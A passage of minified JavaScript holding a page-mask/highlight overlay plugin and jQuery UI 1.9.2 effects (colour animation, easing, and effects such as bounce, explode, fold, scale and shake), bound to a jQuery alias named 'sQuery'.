return this;},init:function init(c,els){$.mask.removeOverlay();var padding=c.padding||0,paddingLeft=c.paddingLeft||0,paddingTop=c.paddingTop||0,bounds=[],xValues=[0],sortedX=[];els.each(function(i,el){var $el=$(el),offset=$el.offset(),x0=offset.left-padding-paddingLeft,y0=offset.top-padding-paddingTop,x1=offset.left+$el.outerWidth()+padding+paddingLeft,y1=offset.top+$el.outerHeight()+padding+paddingTop;bounds.push({topLeft:{x:x0,y:y0},bottomRight:{x:x1,y:y1}});xValues.push(x0);xValues.push(x1);});xValues.push($(document).width());xValues.sort(function(a,b){return a-b;});var last;var i;var j;var bound;for(i=0;i<xValues.length;i++){if(last!=xValues[i]){last=xValues[i];sortedX.push(xValues[i]);}}
bounds.sort(function(a,b){return a.topLeft.y-b.topLeft.y;});for(i=0;i<sortedX.length-1;i++){var x0=sortedX[i],x1=sortedX[i+1],intersecting=[];for(j=0;j<bounds.length;j++){bound=bounds[j];if(bound.topLeft.x<=x0&&bound.bottomRight.x>=x1){intersecting.push([bound.topLeft.y,bound.bottomRight.y]);}}
var yValues=[0];for(j=0;j<intersecting.length;j++){bound=intersecting[j];if(bound[0]>yValues[yValues.length-1]){yValues.push(bound[0]);yValues.push(bound[1]);}else{yValues.pop();yValues.push(bound[1]);}}
yValues.push($(document).height());for(j=0;j<yValues.length-1;j=j+2){show(x0,yValues[j],x1,yValues[j+1],c);}}
mask=$('.'+c.layerClass);if(c.closeOnEsc){$(document).on("keydown.mask",function(e){if(e.keyCode==27){$.mask.close(e);}});}
if(c.closeOnClick){mask.on("click.mask",function(e){$.mask.close(e);});}
$(window).on("resize.mask",function(){$.mask.fit();});$(window).on("scroll.mask",function(){$.mask.fit();});},close:function close(){if(loaded){if(call(config.onBeforeClose)===false){return this;}
mask.fadeOut(config.closeSpeed);mask.off("click.mask");$(document).off("keydown.mask");$(window).off("resize.mask");$(window).off("scroll.mask");if(call(config.onClose)===false){return this;}
loaded=false;}
return this;},closeSlient:function(){if(loaded){mask.fadeOut(config.closeSpeed);mask.off("click.mask");$(document).off("keydown.mask");$(window).off("resize.mask");$(window).off("scroll.mask");loaded=false;}
return this;},fit:function fit(){$.mask.init(config,elements);},removeOverlay:function removeOverlay(){if(mask){mask.off("click.mask");$(document).off("keydown.mask");$(window).off("resize.mask");$(window).off("scroll.mask");mask.remove();}},getMask:function(){return mask;},isLoaded:function(fully){return fully?loaded=='full':loaded;},getConf:function(){return config;},setConf:function(c){c=c||c;config=c=$.extend($.extend({},highlight.conf),c);return c;},getApparent:function(){return elements;}};$.fn.mask=function(conf){$.mask.load(conf);return this;};$.fn.highlight=function(conf){$.mask.load(conf,this);return this;};})(sQuery);sQuery.effects||function(e,t){var i=e.uiBackCompat!==!1,s="ui-effects-";e.effects={effect:{}},function(t,i){function s(e,t,i){var s=c[t.type]||{};return null==e?i||!t.def?null:t.def:(e=s.floor?~~e:parseFloat(e),isNaN(e)?t.def:s.mod?(e+s.mod)%s.mod:0>e?0:e>s.max?s.max:e)}function n(e){var s=u(),n=s._rgba=[];return e=e.toLowerCase(),m(l,function(t,a){var o,r=a.re.exec(e),h=r&&a.parse(r),l=a.space||"rgba";return h?(o=s[l](h),s[d[l].cache]=o[d[l].cache],n=s._rgba=o._rgba,!1):i}),n.length?("0,0,0,0"===n.join()&&t.extend(n,o.transparent),s):o[e]}function a(e,t,i){return i=(i+1)%1,1>6*i?e+6*(t-e)*i:1>2*i?t:2>3*i?e+6*(t-e)*(2/3-i):e}var o,r="backgroundColor borderBottomColor borderLeftColor borderRightColor borderTopColor color columnRuleColor outlineColor textDecorationColor textEmphasisColor".split(" "),h=/^([\-+])=\s*(\d+\.?\d*)/,l=[{re:/rgba?\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(\d+(?:\.\d+)?)\s*)?\)/,parse:function(e){return[e[1],e[2],e[3],e[4]]}},{re:/rgba?\(\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d+(?:\.\d+)?)\s*)?\)/,parse:function(e){return[2.55*e[1],2.55*e[2],2.55*e[3],e[4]]}},{re:/#([a-f0-9]{2})([a-f0-9]{2})([a-f0-9]{2})/,parse:function(e){return[parseInt(e[1],16),parseInt(e[2],16),parseInt(e[3],16)]}},{re:/#([a-f0-9])([a-f0-9])([a-f0-9])/,parse:function(e){return[parseInt(e[1]+e[1],16),parseInt(e[2]+e[2],16),parseInt(e[3]+e[3],16)]}},{re:/hsla?\(\s*(\d+(?:\.\d+)?)\s*,\s*(\d+(?:\.\d+)?)\%\s*,\s*(\d+(?:\.\d+)?)\%\s*(?:,\s*(\d+(?:\.\d+)?)\s*)?\)/,space:"hsla",parse:function(e){return[e[1],e[2]/100,e[3]/100,e[4]]}}],u=t.Color=function(e,i,s,n){return new t.Color.fn.parse(e,i,s,n)},d={rgba:{props:{red:{idx:0,type:"byte"},green:{idx:1,type:"byte"},blue:{idx:2,type:"byte"}}},hsla:{props:{hue:{idx:0,type:"degrees"},saturation:{idx:1,type:"percent"},lightness:{idx:2,type:"percent"}}}},c={"byte":{floor:!0,max:255},percent:{max:1},degrees:{mod:360,floor:!0}},p=u.support={},f=t("<p>")[0],m=t.each;f.style.cssText="background-color:rgba(1,1,1,.5)",p.rgba=f.style.backgroundColor.indexOf("rgba")>-1,m(d,function(e,t){t.cache="_"+e,t.props.alpha={idx:3,type:"percent",def:1}}),u.fn=t.extend(u.prototype,{parse:function(a,r,h,l){if(a===i)return this._rgba=[null,null,null,null],this;(a.jquery||a.nodeType)&&(a=t(a).css(r),r=i);var c=this,p=t.type(a),f=this._rgba=[];return r!==i&&(a=[a,r,h,l],p="array"),"string"===p?this.parse(n(a)||o._default):"array"===p?(m(d.rgba.props,function(e,t){f[t.idx]=s(a[t.idx],t)}),this):"object"===p?(a instanceof u?m(d,function(e,t){a[t.cache]&&(c[t.cache]=a[t.cache].slice())}):m(d,function(t,i){var n=i.cache;m(i.props,function(e,t){if(!c[n]&&i.to){if("alpha"===e||null==a[e])return;c[n]=i.to(c._rgba)}c[n][t.idx]=s(a[e],t,!0)}),c[n]&&0>e.inArray(null,c[n].slice(0,3))&&(c[n][3]=1,i.from&&(c._rgba=i.from(c[n])))}),this):i},is:function(e){var t=u(e),s=!0,n=this;return m(d,function(e,a){var o,r=t[a.cache];return r&&(o=n[a.cache]||a.to&&a.to(n._rgba)||[],m(a.props,function(e,t){return null!=r[t.idx]?s=r[t.idx]===o[t.idx]:i})),s}),s},_space:function(){var e=[],t=this;return m(d,function(i,s){t[s.cache]&&e.push(i)}),e.pop()},transition:function(e,t){var i=u(e),n=i._space(),a=d[n],o=0===this.alpha()?u("transparent"):this,r=o[a.cache]||a.to(o._rgba),h=r.slice();return i=i[a.cache],m(a.props,function(e,n){var a=n.idx,o=r[a],l=i[a],u=c[n.type]||{};null!==l&&(null===o?h[a]=l:(u.mod&&(l-o>u.mod/2?o+=u.mod:o-l>u.mod/2&&(o-=u.mod)),h[a]=s((l-o)*t+o,n)))}),this[n](h)},blend:function(e){if(1===this._rgba[3])return this;var i=this._rgba.slice(),s=i.pop(),n=u(e)._rgba;return u(t.map(i,function(e,t){return(1-s)*n[t]+s*e}))},toRgbaString:function(){var e="rgba(",i=t.map(this._rgba,function(e,t){return null==e?t>2?1:0:e});return 1===i[3]&&(i.pop(),e="rgb("),e+i.join()+")"},toHslaString:function(){var e="hsla(",i=t.map(this.hsla(),function(e,t){return null==e&&(e=t>2?1:0),t&&3>t&&(e=Math.round(100*e)+"%"),e});return 1===i[3]&&(i.pop(),e="hsl("),e+i.join()+")"},toHexString:function(e){var i=this._rgba.slice(),s=i.pop();return e&&i.push(~~(255*s)),"#"+t.map(i,function(e){return e=(e||0).toString(16),1===e.length?"0"+e:e}).join("")},toString:function(){return 0===this._rgba[3]?"transparent":this.toRgbaString()}}),u.fn.parse.prototype=u.fn,d.hsla.to=function(e){if(null==e[0]||null==e[1]||null==e[2])return[null,null,null,e[3]];var t,i,s=e[0]/255,n=e[1]/255,a=e[2]/255,o=e[3],r=Math.max(s,n,a),h=Math.min(s,n,a),l=r-h,u=r+h,d=.5*u;return t=h===r?0:s===r?60*(n-a)/l+360:n===r?60*(a-s)/l+120:60*(s-n)/l+240,i=0===d||1===d?d:.5>=d?l/u:l/(2-u),[Math.round(t)%360,i,d,null==o?1:o]},d.hsla.from=function(e){if(null==e[0]||null==e[1]||null==e[2])return[null,null,null,e[3]];var t=e[0]/360,i=e[1],s=e[2],n=e[3],o=.5>=s?s*(1+i):s+i-s*i,r=2*s-o;return[Math.round(255*a(r,o,t+1/3)),Math.round(255*a(r,o,t)),Math.round(255*a(r,o,t-1/3)),n]},m(d,function(e,n){var a=n.props,o=n.cache,r=n.to,l=n.from;u.fn[e]=function(e){if(r&&!this[o]&&(this[o]=r(this._rgba)),e===i)return this[o].slice();var n,h=t.type(e),d="array"===h||"object"===h?e:arguments,c=this[o].slice();return m(a,function(e,t){var i=d["object"===h?e:t.idx];null==i&&(i=c[t.idx]),c[t.idx]=s(i,t)}),l?(n=u(l(c)),n[o]=c,n):u(c)},m(a,function(i,s){u.fn[i]||(u.fn[i]=function(n){var a,o=t.type(n),r="alpha"===i?this._hsla?"hsla":"rgba":e,l=this[r](),u=l[s.idx];return"undefined"===o?u:("function"===o&&(n=n.call(this,u),o=t.type(n)),null==n&&s.empty?this:("string"===o&&(a=h.exec(n),a&&(n=u+parseFloat(a[2])*("+"===a[1]?1:-1))),l[s.idx]=n,this[r](l)))})})}),m(r,function(e,i){t.cssHooks[i]={set:function(e,s){var a,o,r="";if("string"!==t.type(s)||(a=n(s))){if(s=u(a||s),!p.rgba&&1!==s._rgba[3]){for(o="backgroundColor"===i?e.parentNode:e;(""===r||"transparent"===r)&&o&&o.style;)try{r=t.css(o,"backgroundColor"),o=o.parentNode}catch(h){}s=s.blend(r&&"transparent"!==r?r:"_default")}s=s.toRgbaString()}try{e.style[i]=s}catch(l){}}},t.fx.step[i]=function(e){e.colorInit||(e.start=u(e.elem,i),e.end=u(e.end),e.colorInit=!0),t.cssHooks[i].set(e.elem,e.start.transition(e.end,e.pos))}}),t.cssHooks.borderColor={expand:function(e){var t={};return m(["Top","Right","Bottom","Left"],function(i,s){t["border"+s+"Color"]=e}),t}},o=t.Color.names={aqua:"#00ffff",black:"#000000",blue:"#0000ff",fuchsia:"#ff00ff",gray:"#808080",green:"#008000",lime:"#00ff00",maroon:"#800000",navy:"#000080",olive:"#808000",purple:"#800080",red:"#ff0000",silver:"#c0c0c0",teal:"#008080",white:"#ffffff",yellow:"#ffff00",transparent:[null,null,null,0],_default:"#ffffff"}}(sQuery),function(){function i(){var t,i,s=this.ownerDocument.defaultView?this.ownerDocument.defaultView.getComputedStyle(this,null):this.currentStyle,n={};if(s&&s.length&&s[0]&&s[s[0]])for(i=s.length;i--;)t=s[i],"string"==typeof s[t]&&(n[e.camelCase(t)]=s[t]);else for(t in s)"string"==typeof s[t]&&(n[t]=s[t]);return n}function s(t,i){var s,n,o={};for(s in i)n=i[s],t[s]!==n&&(a[s]||(e.fx.step[s]||!isNaN(parseFloat(n)))&&(o[s]=n));return o}var n=["add","remove","toggle"],a={border:1,borderBottom:1,borderColor:1,borderLeft:1,borderRight:1,borderTop:1,borderWidth:1,margin:1,padding:1};e.each(["borderLeftStyle","borderRightStyle","borderBottomStyle","borderTopStyle"],function(t,i){e.fx.step[i]=function(e){("none"!==e.end&&!e.setAttr||1===e.pos&&!e.setAttr)&&(sQuery.style(e.elem,i,e.end),e.setAttr=!0)}}),e.effects.animateClass=function(t,a,o,r){var h=e.speed(a,o,r);return this.queue(function(){var a,o=e(this),r=o.attr("class")||"",l=h.children?o.find("*").andSelf():o;l=l.map(function(){var t=e(this);return{el:t,start:i.call(this)}}),a=function(){e.each(n,function(e,i){t[i]&&o[i+"Class"](t[i])})},a(),l=l.map(function(){return this.end=i.call(this.el[0]),this.diff=s(this.start,this.end),this}),o.attr("class",r),l=l.map(function(){var t=this,i=e.Deferred(),s=sQuery.extend({},h,{queue:!1,complete:function(){i.resolve(t)}});return this.el.animate(this.diff,s),i.promise()}),e.when.apply(e,l.get()).done(function(){a(),e.each(arguments,function(){var t=this.el;e.each(this.diff,function(e){t.css(e,"")})}),h.complete.call(o[0])})})},e.fn.extend({_addClass:e.fn.addClass,addClass:function(t,i,s,n){return i?e.effects.animateClass.call(this,{add:t},i,s,n):this._addClass(t)},_removeClass:e.fn.removeClass,removeClass:function(t,i,s,n){return i?e.effects.animateClass.call(this,{remove:t},i,s,n):this._removeClass(t)},_toggleClass:e.fn.toggleClass,toggleClass:function(i,s,n,a,o){return"boolean"==typeof s||s===t?n?e.effects.animateClass.call(this,s?{add:i}:{remove:i},n,a,o):this._toggleClass(i,s):e.effects.animateClass.call(this,{toggle:i},s,n,a)},switchClass:function(t,i,s,n,a){return e.effects.animateClass.call(this,{add:i,remove:t},s,n,a)}})}(),function(){function n(t,i,s,n){return e.isPlainObject(t)&&(i=t,t=t.effect),t={effect:t},null==i&&(i={}),e.isFunction(i)&&(n=i,s=null,i={}),("number"==typeof i||e.fx.speeds[i])&&(n=s,s=i,i={}),e.isFunction(s)&&(n=s,s=null),i&&e.extend(t,i),s=s||i.duration,t.duration=e.fx.off?0:"number"==typeof s?s:s in e.fx.speeds?e.fx.speeds[s]:e.fx.speeds._default,t.complete=n||i.complete,t}function a(t){return!t||"number"==typeof t||e.fx.speeds[t]?!0:"string"!=typeof t||e.effects.effect[t]?!1:i&&e.effects[t]?!1:!0}e.extend(e.effects,{version:"1.9.2",save:function(e,t){for(var i=0;t.length>i;i++)null!==t[i]&&e.data(s+t[i],e[0].style[t[i]])},restore:function(e,i){var n,a;for(a=0;i.length>a;a++)null!==i[a]&&(n=e.data(s+i[a]),n===t&&(n=""),e.css(i[a],n))},setMode:function(e,t){return"toggle"===t&&(t=e.is(":hidden")?"show":"hide"),t},getBaseline:function(e,t){var i,s;switch(e[0]){case"top":i=0;break;case"middle":i=.5;break;case"bottom":i=1;break;default:i=e[0]/t.height}switch(e[1]){case"left":s=0;break;case"center":s=.5;break;case"right":s=1;break;default:s=e[1]/t.width}return{x:s,y:i}},createWrapper:function(t){if(t.parent().is(".ui-effects-wrapper"))return t.parent();var i={width:t.outerWidth(!0),height:t.outerHeight(!0),"float":t.css("float")},s=e("<div></div>").addClass("ui-effects-wrapper").css({fontSize:"100%",background:"transparent",border:"none",margin:0,padding:0}),n={width:t.width(),height:t.height()},a=document.activeElement;try{a.id}catch(o){a=document.body}return t.wrap(s),(t[0]===a||e.contains(t[0],a))&&e(a).focus(),s=t.parent(),"static"===t.css("position")?(s.css({position:"relative"}),t.css({position:"relative"})):(e.extend(i,{position:t.css("position"),zIndex:t.css("z-index")}),e.each(["top","left","bottom","right"],function(e,s){i[s]=t.css(s),isNaN(parseInt(i[s],10))&&(i[s]="auto")}),t.css({position:"relative",top:0,left:0,right:"auto",bottom:"auto"})),t.css(n),s.css(i).show()},removeWrapper:function(t){var i=document.activeElement;return t.parent().is(".ui-effects-wrapper")&&(t.parent().replaceWith(t),(t[0]===i||e.contains(t[0],i))&&e(i).focus()),t},setTransition:function(t,i,s,n){return n=n||{},e.each(i,function(e,i){var a=t.cssUnit(i);a[0]>0&&(n[i]=a[0]*s+a[1])}),n}}),e.fn.extend({effect:function(){function t(t){function i(){e.isFunction(a)&&a.call(n[0]),e.isFunction(t)&&t()}var n=e(this),a=s.complete,o=s.mode;(n.is(":hidden")?"hide"===o:"show"===o)?i():r.call(n[0],s,i)}var s=n.apply(this,arguments),a=s.mode,o=s.queue,r=e.effects.effect[s.effect],h=!r&&i&&e.effects[s.effect];return e.fx.off||!r&&!h?a?this[a](s.duration,s.complete):this.each(function(){s.complete&&s.complete.call(this)}):r?o===!1?this.each(t):this.queue(o||"fx",t):h.call(this,{options:s,duration:s.duration,callback:s.complete,mode:s.mode})},_show:e.fn.show,show:function(e){if(a(e))return this._show.apply(this,arguments);var t=n.apply(this,arguments);return t.mode="show",this.effect.call(this,t)},_hide:e.fn.hide,hide:function(e){if(a(e))return this._hide.apply(this,arguments);var t=n.apply(this,arguments);return t.mode="hide",this.effect.call(this,t)},__toggle:e.fn.toggle,toggle:function(t){if(a(t)||"boolean"==typeof t||e.isFunction(t))return this.__toggle.apply(this,arguments);var i=n.apply(this,arguments);return i.mode="toggle",this.effect.call(this,i)},cssUnit:function(t){var i=this.css(t),s=[];return e.each(["em","px","%","pt"],function(e,t){i.indexOf(t)>0&&(s=[parseFloat(i),t])}),s}})}(),function(){var t={};e.each(["Quad","Cubic","Quart","Quint","Expo"],function(e,i){t[i]=function(t){return Math.pow(t,e+2)}}),e.extend(t,{Sine:function(e){return 1-Math.cos(e*Math.PI/2)},Circ:function(e){return 1-Math.sqrt(1-e*e)},Elastic:function(e){return 0===e||1===e?e:-Math.pow(2,8*(e-1))*Math.sin((80*(e-1)-7.5)*Math.PI/15)},Back:function(e){return e*e*(3*e-2)},Bounce:function(e){for(var t,i=4;((t=Math.pow(2,--i))-1)/11>e;);return 1/Math.pow(4,3-i)-7.5625*Math.pow((3*t-2)/22-e,2)}}),e.each(t,function(t,i){e.easing["easeIn"+t]=i,e.easing["easeOut"+t]=function(e){return 1-i(1-e)},e.easing["easeInOut"+t]=function(e){return.5>e?i(2*e)/2:1-i(-2*e+2)/2}})}()}(sQuery);(function(e){var t=/up|down|vertical/,i=/up|left|vertical|horizontal/;e.effects.effect.blind=function(s,n){var a,o,r,l=e(this),h=["position","top","bottom","left","right","height","width"],u=e.effects.setMode(l,s.mode||"hide"),d=s.direction||"up",c=t.test(d),p=c?"height":"width",f=c?"top":"left",m=i.test(d),g={},v="show"===u;l.parent().is(".ui-effects-wrapper")?e.effects.save(l.parent(),h):e.effects.save(l,h),l.show(),a=e.effects.createWrapper(l).css({overflow:"hidden"}),o=a[p](),r=parseFloat(a.css(f))||0,g[p]=v?o:0,m||(l.css(c?"bottom":"right",0).css(c?"top":"left","auto").css({position:"absolute"}),g[f]=v?r:o+r),v&&(a.css(p,0),m||a.css(f,r+o)),a.animate(g,{duration:s.duration,easing:s.easing,queue:!1,complete:function(){"hide"===u&&l.hide(),e.effects.restore(l,h),e.effects.removeWrapper(l),n()}})}})(sQuery);(function(e){e.effects.effect.bounce=function(t,i){var s,n,a,o=e(this),r=["position","top","bottom","left","right","height","width"],l=e.effects.setMode(o,t.mode||"effect"),h="hide"===l,u="show"===l,d=t.direction||"up",c=t.distance,p=t.times||5,f=2*p+(u||h?1:0),m=t.duration/f,g=t.easing,v="up"===d||"down"===d?"top":"left",y="up"===d||"left"===d,b=o.queue(),_=b.length;for((u||h)&&r.push("opacity"),e.effects.save(o,r),o.show(),e.effects.createWrapper(o),c||(c=o["top"===v?"outerHeight":"outerWidth"]()/3),u&&(a={opacity:1},a[v]=0,o.css("opacity",0).css(v,y?2*-c:2*c).animate(a,m,g)),h&&(c/=Math.pow(2,p-1)),a={},a[v]=0,s=0;p>s;s++)n={},n[v]=(y?"-=":"+=")+c,o.animate(n,m,g).animate(a,m,g),c=h?2*c:c/2;h&&(n={opacity:0},n[v]=(y?"-=":"+=")+c,o.animate(n,m,g)),o.queue(function(){h&&o.hide(),e.effects.restore(o,r),e.effects.removeWrapper(o),i()}),_>1&&b.splice.apply(b,[1,0].concat(b.splice(_,f+1))),o.dequeue()}})(sQuery);(function(e){e.effects.effect.clip=function(t,i){var s,n,a,o=e(this),r=["position","top","bottom","left","right","height","width"],l=e.effects.setMode(o,t.mode||"hide"),h="show"===l,u=t.direction||"vertical",d="vertical"===u,c=d?"height":"width",p=d?"top":"left",f={};e.effects.save(o,r),o.show(),s=e.effects.createWrapper(o).css({overflow:"hidden"}),n="IMG"===o[0].tagName?s:o,a=n[c](),h&&(n.css(c,0),n.css(p,a/2)),f[c]=h?a:0,f[p]=h?0:a/2,n.animate(f,{queue:!1,duration:t.duration,easing:t.easing,complete:function(){h||o.hide(),e.effects.restore(o,r),e.effects.removeWrapper(o),i()}})}})(sQuery);(function(e){e.effects.effect.drop=function(t,i){var s,n=e(this),a=["position","top","bottom","left","right","opacity","height","width"],o=e.effects.setMode(n,t.mode||"hide"),r="show"===o,l=t.direction||"left",h="up"===l||"down"===l?"top":"left",u="up"===l||"left"===l?"pos":"neg",d={opacity:r?1:0};e.effects.save(n,a),n.show(),e.effects.createWrapper(n),s=t.distance||n["top"===h?"outerHeight":"outerWidth"](!0)/2,r&&n.css("opacity",0).css(h,"pos"===u?-s:s),d[h]=(r?"pos"===u?"+=":"-=":"pos"===u?"-=":"+=")+s,n.animate(d,{queue:!1,duration:t.duration,easing:t.easing,complete:function(){"hide"===o&&n.hide(),e.effects.restore(n,a),e.effects.removeWrapper(n),i()}})}})(sQuery);(function(e){e.effects.effect.explode=function(t,i){function s(){b.push(this),b.length===d*c&&n()}function n(){p.css({visibility:"visible"}),e(b).remove(),m||p.hide(),i()}var a,o,r,l,h,u,d=t.pieces?Math.round(Math.sqrt(t.pieces)):3,c=d,p=e(this),f=e.effects.setMode(p,t.mode||"hide"),m="show"===f,g=p.show().css("visibility","hidden").offset(),v=Math.ceil(p.outerWidth()/c),y=Math.ceil(p.outerHeight()/d),b=[];for(a=0;d>a;a++)for(l=g.top+a*y,u=a-(d-1)/2,o=0;c>o;o++)r=g.left+o*v,h=o-(c-1)/2,p.clone().appendTo("body").wrap("<div></div>").css({position:"absolute",visibility:"visible",left:-o*v,top:-a*y}).parent().addClass("ui-effects-explode").css({position:"absolute",overflow:"hidden",width:v,height:y,left:r+(m?h*v:0),top:l+(m?u*y:0),opacity:m?0:1}).animate({left:r+(m?0:h*v),top:l+(m?0:u*y),opacity:m?1:0},t.duration||500,t.easing,s)}})(sQuery);(function(e){e.effects.effect.fade=function(t,i){var s=e(this),n=e.effects.setMode(s,t.mode||"toggle");s.animate({opacity:n},{queue:!1,duration:t.duration,easing:t.easing,complete:i})}})(sQuery);(function(e){e.effects.effect.fold=function(t,i){var s,n,a=e(this),o=["position","top","bottom","left","right","height","width"],r=e.effects.setMode(a,t.mode||"hide"),l="show"===r,h="hide"===r,u=t.size||15,d=/([0-9]+)%/.exec(u),c=!!t.horizFirst,p=l!==c,f=p?["width","height"]:["height","width"],m=t.duration/2,g={},v={};e.effects.save(a,o),a.show(),s=e.effects.createWrapper(a).css({overflow:"hidden"}),n=p?[s.width(),s.height()]:[s.height(),s.width()],d&&(u=parseInt(d[1],10)/100*n[h?0:1]),l&&s.css(c?{height:0,width:u}:{height:u,width:0}),g[f[0]]=l?n[0]:u,v[f[1]]=l?n[1]:0,s.animate(g,m,t.easing).animate(v,m,t.easing,function(){h&&a.hide(),e.effects.restore(a,o),e.effects.removeWrapper(a),i()})}})(sQuery);(function(e){e.effects.effect.highlight=function(t,i){var s=e(this),n=["backgroundImage","backgroundColor","opacity"],a=e.effects.setMode(s,t.mode||"show"),o={backgroundColor:s.css("backgroundColor")};"hide"===a&&(o.opacity=0),e.effects.save(s,n),s.show().css({backgroundImage:"none",backgroundColor:t.color||"#ffff99"}).animate(o,{queue:!1,duration:t.duration,easing:t.easing,complete:function(){"hide"===a&&s.hide(),e.effects.restore(s,n),i()}})}})(sQuery);(function(e){e.effects.effect.pulsate=function(t,i){var s,n=e(this),a=e.effects.setMode(n,t.mode||"show"),o="show"===a,r="hide"===a,l=o||"hide"===a,h=2*(t.times||5)+(l?1:0),u=t.duration/h,d=0,c=n.queue(),p=c.length;for((o||!n.is(":visible"))&&(n.css("opacity",0).show(),d=1),s=1;h>s;s++)n.animate({opacity:d},u,t.easing),d=1-d;n.animate({opacity:d},u,t.easing),n.queue(function(){r&&n.hide(),i()}),p>1&&c.splice.apply(c,[1,0].concat(c.splice(p,h+1))),n.dequeue()}})(sQuery);(function(e){e.effects.effect.puff=function(t,i){var s=e(this),n=e.effects.setMode(s,t.mode||"hide"),a="hide"===n,o=parseInt(t.percent,10)||150,r=o/100,h={height:s.height(),width:s.width(),outerHeight:s.outerHeight(),outerWidth:s.outerWidth()};e.extend(t,{effect:"scale",queue:!1,fade:!0,mode:n,complete:i,percent:a?o:100,from:a?h:{height:h.height*r,width:h.width*r,outerHeight:h.outerHeight*r,outerWidth:h.outerWidth*r}}),s.effect(t)},e.effects.effect.scale=function(t,i){var s=e(this),n=e.extend(!0,{},t),a=e.effects.setMode(s,t.mode||"effect"),o=parseInt(t.percent,10)||(0===parseInt(t.percent,10)?0:"hide"===a?0:100),r=t.direction||"both",h=t.origin,l={height:s.height(),width:s.width(),outerHeight:s.outerHeight(),outerWidth:s.outerWidth()},u={y:"horizontal"!==r?o/100:1,x:"vertical"!==r?o/100:1};n.effect="size",n.queue=!1,n.complete=i,"effect"!==a&&(n.origin=h||["middle","center"],n.restore=!0),n.from=t.from||("show"===a?{height:0,width:0,outerHeight:0,outerWidth:0}:l),n.to={height:l.height*u.y,width:l.width*u.x,outerHeight:l.outerHeight*u.y,outerWidth:l.outerWidth*u.x},n.fade&&("show"===a&&(n.from.opacity=0,n.to.opacity=1),"hide"===a&&(n.from.opacity=1,n.to.opacity=0)),s.effect(n)},e.effects.effect.size=function(t,i){var s,n,a,o=e(this),r=["position","top","bottom","left","right","width","height","overflow","opacity"],h=["position","top","bottom","left","right","overflow","opacity"],l=["width","height","overflow"],u=["fontSize"],d=["borderTopWidth","borderBottomWidth","paddingTop","paddingBottom"],c=["borderLeftWidth","borderRightWidth","paddingLeft","paddingRight"],p=e.effects.setMode(o,t.mode||"effect"),f=t.restore||"effect"!==p,m=t.scale||"both",g=t.origin||["middle","center"],v=o.css("position"),y=f?r:h,b={height:0,width:0,outerHeight:0,outerWidth:0};"show"===p&&o.show(),s={height:o.height(),width:o.width(),outerHeight:o.outerHeight(),outerWidth:o.outerWidth()},"toggle"===t.mode&&"show"===p?(o.from=t.to||b,o.to=t.from||s):(o.from=t.from||("show"===p?b:s),o.to=t.to||("hide"===p?b:s)),a={from:{y:o.from.height/s.height,x:o.from.width/s.width},to:{y:o.to.height/s.height,x:o.to.width/s.width}},("box"===m||"both"===m)&&(a.from.y!==a.to.y&&(y=y.concat(d),o.from=e.effects.setTransition(o,d,a.from.y,o.from),o.to=e.effects.setTransition(o,d,a.to.y,o.to)),a.from.x!==a.to.x&&(y=y.concat(c),o.from=e.effects.setTransition(o,c,a.from.x,o.from),o.to=e.effects.setTransition(o,c,a.to.x,o.to))),("content"===m||"both"===m)&&a.from.y!==a.to.y&&(y=y.concat(u).concat(l),o.from=e.effects.setTransition(o,u,a.from.y,o.from),o.to=e.effects.setTransition(o,u,a.to.y,o.to)),e.effects.save(o,y),o.show(),e.effects.createWrapper(o),o.css("overflow","hidden").css(o.from),g&&(n=e.effects.getBaseline(g,s),o.from.top=(s.outerHeight-o.outerHeight())*n.y,o.from.left=(s.outerWidth-o.outerWidth())*n.x,o.to.top=(s.outerHeight-o.to.outerHeight)*n.y,o.to.left=(s.outerWidth-o.to.outerWidth)*n.x),o.css(o.from),("content"===m||"both"===m)&&(d=d.concat(["marginTop","marginBottom"]).concat(u),c=c.concat(["marginLeft","marginRight"]),l=r.concat(d).concat(c),o.find("*[width]").each(function(){var i=e(this),s={height:i.height(),width:i.width(),outerHeight:i.outerHeight(),outerWidth:i.outerWidth()};f&&e.effects.save(i,l),i.from={height:s.height*a.from.y,width:s.width*a.from.x,outerHeight:s.outerHeight*a.from.y,outerWidth:s.outerWidth*a.from.x},i.to={height:s.height*a.to.y,width:s.width*a.to.x,outerHeight:s.height*a.to.y,outerWidth:s.width*a.to.x},a.from.y!==a.to.y&&(i.from=e.effects.setTransition(i,d,a.from.y,i.from),i.to=e.effects.setTransition(i,d,a.to.y,i.to)),a.from.x!==a.to.x&&(i.from=e.effects.setTransition(i,c,a.from.x,i.from),i.to=e.effects.setTransition(i,c,a.to.x,i.to)),i.css(i.from),i.animate(i.to,t.duration,t.easing,function(){f&&e.effects.restore(i,l)})})),o.animate(o.to,{queue:!1,duration:t.duration,easing:t.easing,complete:function(){0===o.to.opacity&&o.css("opacity",o.from.opacity),"hide"===p&&o.hide(),e.effects.restore(o,y),f||("static"===v?o.css({position:"relative",top:o.to.top,left:o.to.left}):e.each(["top","left"],function(e,t){o.css(t,function(t,i){var s=parseInt(i,10),n=e?o.to.left:o.to.top;return"auto"===i?n+"px":s+n+"px"})})),e.effects.removeWrapper(o),i()}})}})(sQuery);(function(e){e.effects.effect.shake=function(t,i){var s,n=e(this),a=["position","top","bottom","left","right","height","width"],o=e.effects.setMode(n,t.mode||"effect"),r=t.direction||"left",h=t.distance||20,l=t.times||3,u=2*l+1,d=Math.round(t.duration/u),c="up"===r||"down"===r?"top":"left",p="up"===r||"left"===r,f={},m={},g={},v=n.queue(),y=v.length;for(e.effects.save(n,a),n.show(),e.effects.createWrapper(n),f[c]=(p?"-=":"+=")+h,m[c]=(p?"+=":"-=")+2*h,g[c]=(p?"-=":"+=")+2*h,n.animate(f,d,t.easing),s=1;l>s;s++)n.animate(m,d,t.easing).animate(g,d,t.easing);n.animate(m,d,t.easing).animate(f,d/2,t.easing).queue(function(){"hide"===o&&n.hide(),e.effects.restore(n,a),e.effects.removeWrapper(n),i()}),y>1&&v.splice.apply(v,[1,0].concat(v.splice(y,u+1))),n.dequeue()}})(sQuery);(function(e){e.effects.effect.slide=function(t,i){var 